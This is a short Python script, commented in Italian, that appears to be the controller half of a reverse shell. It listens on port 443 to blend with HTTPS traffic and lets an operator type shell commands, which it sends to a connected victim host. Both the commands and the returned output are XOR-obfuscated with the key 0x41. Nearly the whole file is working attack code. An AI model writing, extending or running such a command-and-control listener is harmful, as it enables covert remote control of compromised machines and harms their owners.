
#server che resta in ascolto di connessioni dai client
import socket,pickle 


while True:
    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(("0.0.0.0", 443))
    except:
        print("Connessione persa")
        continue
    s.listen(2)
    print("Listening on port 443... ")

    (client, (ip, port)) = s.accept()
    print(" Received connection from : ", ip)
    if ip =='127.0.0.1':
        print("no")
    else:
        while True:
            command = input('~$ ')
            print(command)
            encode = bytearray(command,'utf8')
            
            for i in range(len(encode)):
                encode[i] ^=0x41
            

            #print("code: "+str(encode))
            print("-----")

            try:
                client.send(encode)
            except socket.error:
                break
        
            #ricevo risposta al comando inviato
            buffer_size=10
            packet = client.recv(buffer_size)
            size=len(packet)
            while packet:
                #print(size)
                if size < buffer_size:
                    break
                app =client.recv(buffer_size)
                size=len(app)
                packet=packet+app
            
            """packet= pickle.loads(packet)
            decode=packet.val"""
            packet= bytearray(packet)   
            #print("dati ricevuti: "+ str(packet))
            for i in range(len(packet)):
                packet[i] ^=0x41
            print("decode: "+str(packet.decode('utf-8', 'ignore')))


    print("connessione 1 chiusa")
    client.close()
    s.close()


































